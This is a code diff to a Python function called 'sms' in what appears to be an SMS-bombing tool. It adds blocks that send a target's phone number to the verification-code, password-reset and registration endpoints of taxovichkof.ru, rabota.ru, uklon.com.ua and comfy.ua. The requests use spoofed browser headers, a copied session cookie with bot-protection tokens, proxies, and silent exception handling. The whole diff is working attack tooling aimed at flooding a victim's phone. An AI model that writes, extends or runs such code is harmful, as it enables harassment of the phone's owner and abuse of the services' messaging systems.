@@ -89,8 +89,77 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					header = {
+						"Accept": "application/json, text/plain, */*",
+						"Accept-Encoding": "gzip, deflate, br",
+						"Accept-Language": "en-US,en;q=0.9",
+						"Connection": "keep-alive",
+						"Content-Length": "33",
+						"Content-Type": "application/json;charset=UTF-8",
+						"dnt": "1",
+						"Host": "admin.taxovichkof.ru",
+						"Origin": "https://taxovichkof.ru",
+						"Referer": "https://taxovichkof.ru/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Sec-Fetch-Dest": "empty",
+						"Sec-Fetch-Mode": "cors",
+						"Sec-Fetch-Site": "same-site",
+						"sec-gpc": "1",
+						"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+
+					payload = {
+						"user_phone": num2
+					}
+					requests.post("https://admin.taxovichkof.ru/api/account/get_password", json=payload, headers=header, proxies = proxies)
+				except:
+					pass
+
+				try:
 					payload = {"request":{"login":number},"request_id":75291684,"application_id":13,"rabota_ru_id":"61e37b73739641004915965152223419","user_tags":[{"id":0,"add_date":"2022-01-16","name":"hr_banners_show"},{"id":0,"add_date":"2022-01-16","name":"web_premium_target"},{"id":0,"add_date":"2022-01-16","name":"courses_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_exclude_reloc2_target"},{"id":0,"add_date":"2022-01-16","name":"web_search_all_regions2_target1"},{"id":0,"add_date":"2022-01-16","name":"profession_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_query_profession_tags_control2"},{"id":0,"add_date":"2022-01-16","name":"hr_new_scheduled_action_list_active"}]}
 					requests.post("https://spb.rabota.ru/api-web/v6/code/send.json", json=payload, proxies = proxies)
+				except:
+					pass
+
+				try:
+					header = {
+						"Accept": "application/json, text/plain, */*",
+						"Accept-Language": "en-US,en;q=0.9,uk;q=0.8,ru;q=0.7",
+						"app_uid": "d6cc9ca7-2d16-4a82-be61-96a1a7b3f4ba",
+						"City": "kyiv",
+						"client_id": "04F2BB99734848E1A061140A7452D1A9",
+						"Content-Type": "application/json",
+						"Locale": "ru",
+						"Referer": "https://m.uklon.com.ua/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Uklon-Agent": "UklonPwa/1.17.0.193897",
+						"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+
+					payload = {"username":"+"+number}
+					r = requests.post("https://rider.uklon.com.ua/api/v1/phone/send-code", json=payload, headers=header, proxies = proxies)
 				except:
 					pass
 
@@ -781,6 +850,53 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num3 = ""
+					num3 += num[1]
+					num3 += num[2]
+					num2=""
+					num2 += num[3]
+					num2 += num[4]
+					num2 += num[5]
+					num4 = ""
+					num4 += num[6]
+					num4 += num[7]
+					num5 = ""
+					num5 += num[8]
+					num5 += num[9]
+					header = {
+						"accept": "application/json, text/plain, */*",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "106",
+						"content-type": "application/x-www-form-urlencoded",
+						"cookie": "incap_ses_259_1858972=pxBRA9WmwALrke/xTCeYAx6d8GEAAAAArG2a1FdvaH0ThaoHOfAajw==; language=ru; nlbi_1858972=hhZ0CfN6XXxK1S3UTxwWFAAAAADt7Fpd7tMEiNFeGXzij+9K; fp=1; lfp=1/26/2022, 4:00:18 AM; sc=8E37B121-56B1-A0EB-7F10-16F0A3054DDA; nlbi_1858972_2147483646=ohl8PCSKlnJRRgFiTxwWFAAAAAAxfeFxrko4qXH6Bl0cHaDG; reese84=3:G+m2Z0wpBUmwdLlul1pOMQ==:tfNey0mbxq3LHYbjOP4wv0VxfbYscEGSEcvMArnLfPdEebMUGyHXGv1LlPQxZ3pT+UStxhhO2Ly3gpYCBDZ4XmJw1Y2WAbdO0UcrU0tmXUULy0+TooypiQP7S4oXowTAZsZ8LQAlK8fnh8qrUQpXDXlcHGafEkXUbp2V3D2hJ+vxMz9TwRybzY6lAghlFOEvmZwXedUfh9n/JC0ll39jh4wVUO9iAMiDo7BZf9yQ2GS1tG9IQLsAb0ikK7371jfZYBGnir/qpQCxXC2OzJWWLtRYcB/EBelVl81sTsGJmjTJLGTJNcUtjSzPhgiOwsFBn/X9OaHKkVgAQXxKTcuRY38AcGTD1PZubaQ7cqOxnUUZunRjovlX3VjodTItnolaOrvUd+8Cej7tiXTeUZHOs8pBAV9tmhyZfw7IpTYRG4nZir4/k51K1n8qtK4lixC1:82KxZ7gbNO267+sRSbBZky4RFV9Tm0o4+GfQUSGszUo=; frontend=voueco7puoh62dd2447pd1aeu6; customer_group=0; active_city_id=506; visid_incap_1858972=dpBLu2AISPe5/m0Ay6MC/I+d8GEAAAAAQUIPAAAAAADqjYXCMIVVT23qIia/fHHu; last_visited_url=https%3A%2F%2Fcomfy.ua%2Fcustomer%2Faccount%2FgetDynamicPassword",
+						"dnt": "1",
+						"origin": "https://comfy.ua",
+						"referer": "https://comfy.ua/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"x-ray-id": "",
+						"x-session-id": ""
+					}
+
+					payload = {
+						"registration_phone": f"+38(0{num3})-{num2}-{num4}-{num5}",
+						"registration_email": "",
+						"registration_name": "Вася",
+					}
+					requests.post("https://comfy.ua/api/auth/register", data=payload, headers=header, proxies = proxies)
+
+				except:
+					pass
+
+				try:
 					header = {
 						"Accept": "application/json",
 						"Accept-Encoding": "gzip, deflate, br",
@@ -1212,6 +1328,75 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					num = number
+					num3 = ""
+					num3 += num[1]
+					num3 += num[2]
+					num2=""
+					num2 += num[3]
+					num2 += num[4]
+					num2 += num[5]
+					num4 = ""
+					num4 += num[6]
+					num4 += num[7]
+					num5 = ""
+					num5 += num[8]
+					num5 += num[9]
+					header = {
+						"accept": "application/json, text/plain, */*",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "106",
+						"content-type": "application/x-www-form-urlencoded",
+						"cookie": "incap_ses_259_1858972=pxBRA9WmwALrke/xTCeYAx6d8GEAAAAArG2a1FdvaH0ThaoHOfAajw==; language=ru; nlbi_1858972=hhZ0CfN6XXxK1S3UTxwWFAAAAADt7Fpd7tMEiNFeGXzij+9K; fp=1; lfp=1/26/2022, 4:00:18 AM; sc=8E37B121-56B1-A0EB-7F10-16F0A3054DDA; nlbi_1858972_2147483646=ohl8PCSKlnJRRgFiTxwWFAAAAAAxfeFxrko4qXH6Bl0cHaDG; reese84=3:G+m2Z0wpBUmwdLlul1pOMQ==:tfNey0mbxq3LHYbjOP4wv0VxfbYscEGSEcvMArnLfPdEebMUGyHXGv1LlPQxZ3pT+UStxhhO2Ly3gpYCBDZ4XmJw1Y2WAbdO0UcrU0tmXUULy0+TooypiQP7S4oXowTAZsZ8LQAlK8fnh8qrUQpXDXlcHGafEkXUbp2V3D2hJ+vxMz9TwRybzY6lAghlFOEvmZwXedUfh9n/JC0ll39jh4wVUO9iAMiDo7BZf9yQ2GS1tG9IQLsAb0ikK7371jfZYBGnir/qpQCxXC2OzJWWLtRYcB/EBelVl81sTsGJmjTJLGTJNcUtjSzPhgiOwsFBn/X9OaHKkVgAQXxKTcuRY38AcGTD1PZubaQ7cqOxnUUZunRjovlX3VjodTItnolaOrvUd+8Cej7tiXTeUZHOs8pBAV9tmhyZfw7IpTYRG4nZir4/k51K1n8qtK4lixC1:82KxZ7gbNO267+sRSbBZky4RFV9Tm0o4+GfQUSGszUo=; frontend=voueco7puoh62dd2447pd1aeu6; customer_group=0; active_city_id=506; visid_incap_1858972=dpBLu2AISPe5/m0Ay6MC/I+d8GEAAAAAQUIPAAAAAADqjYXCMIVVT23qIia/fHHu; last_visited_url=https%3A%2F%2Fcomfy.ua%2Fcustomer%2Faccount%2FgetDynamicPassword",
+						"dnt": "1",
+						"origin": "https://comfy.ua",
+						"referer": "https://comfy.ua/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"x-ray-id": "",
+						"x-session-id": ""
+					}
+
+					payload = {
+						"registration_phone": f"+38(0{num3})-{num2}-{num4}-{num5}",
+						"registration_email": "",
+						"registration_name": "Вася",
+					}
+					requests.post("https://comfy.ua/api/auth/register", data=payload, headers=header)
+
+				except:
+					pass
+
+				try:
+					header = {
+						"Accept": "application/json, text/plain, */*",
+						"Accept-Language": "en-US,en;q=0.9,uk;q=0.8,ru;q=0.7",
+						"app_uid": "d6cc9ca7-2d16-4a82-be61-96a1a7b3f4ba",
+						"City": "kyiv",
+						"client_id": "04F2BB99734848E1A061140A7452D1A9",
+						"Content-Type": "application/json",
+						"Locale": "ru",
+						"Referer": "https://m.uklon.com.ua/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Uklon-Agent": "UklonPwa/1.17.0.193897",
+						"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+
+					payload = {"username":"+"+number}
+					r = requests.post("https://rider.uklon.com.ua/api/v1/phone/send-code", json=payload, headers=header)
+				except:
+					pass
+
+				try:
 					header = {
 						"Accept": "application/json, text/javascript, */*; q=0.01",
 						"Accept-Encoding": "gzip, deflate, br",
@@ -1333,6 +1518,53 @@ def sms(prx, number, tm, code):
 					}
 					payload = {"phone": num2}
 					requests.post("https://oauth.av.ru/check-phone", json=payload, headers=header)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					header = {
+						"Accept": "application/json, text/plain, */*",
+						"Accept-Encoding": "gzip, deflate, br",
+						"Accept-Language": "en-US,en;q=0.9",
+						"Connection": "keep-alive",
+						"Content-Length": "33",
+						"Content-Type": "application/json;charset=UTF-8",
+						"dnt": "1",
+						"Host": "admin.taxovichkof.ru",
+						"Origin": "https://taxovichkof.ru",
+						"Referer": "https://taxovichkof.ru/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Sec-Fetch-Dest": "empty",
+						"Sec-Fetch-Mode": "cors",
+						"Sec-Fetch-Site": "same-site",
+						"sec-gpc": "1",
+						"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+
+					payload = {
+						"user_phone": num2
+					}
+					requests.post("https://admin.taxovichkof.ru/api/account/get_password", json=payload, headers=header)
 				except:
 					pass
 
